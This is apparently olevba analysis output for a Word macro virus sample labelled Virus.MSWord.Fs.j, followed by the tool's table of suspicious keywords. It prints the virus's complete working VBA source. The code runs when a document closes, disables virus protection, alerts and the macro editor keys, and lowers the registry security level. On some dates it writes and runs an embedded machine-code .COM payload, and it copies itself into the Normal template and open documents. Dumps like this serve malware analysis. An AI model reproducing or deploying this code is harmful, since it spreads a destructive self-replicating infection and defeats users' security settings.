olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fs.j
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fs.j - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Spoony
Private Declare Function SystemParametersInfoA Lib "user32" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long
Private Sub Document_Close(): Dim ν As Byte
On Error Resume Next
υ = ActiveDocument.Saved
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Application.DisplayAlerts = 0
Options.ConfirmConversions = 0
Application.EnableCancelKey = 0
SystemParametersInfoA 97, 1, "", 0
CustomizationContext = MacroContainer
CommandBars("Control Toolbox").Enabled = 0
CommandBars("Tools").Controls(12).Visible = 0
FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&

If Month(Now) Like Day(Now) Or Day(Now) Like WeekDay(Now) Then _
κ = Array(&HFA, &H33, &HC9, &H8B, &HD1, &HFE, &HC1, &H80, &HD6, &H0, &HA, &HC9, &H75, &H2, &HFE, &HC1, &HB2, &H80, &HB8, &H1, &H3, &H9A, &HEE, &H3, &H70, &H0, &HEB, &HE9): _
Open "C:\�.COM" For Binary As #1: For ι = 0 To 27: ν = κ(ι): Put #1, ι, ν: Next: Close: Shell "C:\�.COM", 0

If GetAttr(NormalTemplate.FullName) Mod 2 Then SetAttr NormalTemplate.FullName, 0
If GetSetting("'", "'", "'") Like "" Then SaveSetting "'", "'", "'", ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 50)

If GetAttr(NormalTemplate.FullName) Then
With NormalTemplate.VBProject
If Not .Protection And .HelpContextID <> 7 Then
.VBComponents(1).CodeModule.DeleteLines 1, .VBComponents(1).CodeModule.CountOfLines
.VBComponents(1).CodeModule.AddFromString GetSetting("'", "'", "'")
.HelpContextID = 7
End If: End With: End If

If Len(ActiveDocument.Path) Then
With ActiveDocument.VBProject
If Not .Protection And .HelpContextID <> 7 Then
.VBComponents(1).CodeModule.DeleteLines 1, .VBComponents(1).CodeModule.CountOfLines
.VBComponents(1).CodeModule.AddFromString GetSetting("'", "'", "'")
.HelpContextID = 7
If Not ActiveDocument.ReadOnly Then ActiveDocument.SaveAs ActiveDocument.FullName
End If: End With: End If

SystemParametersInfoA 97, 0, "", 0
ActiveDocument.Saved = υ
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

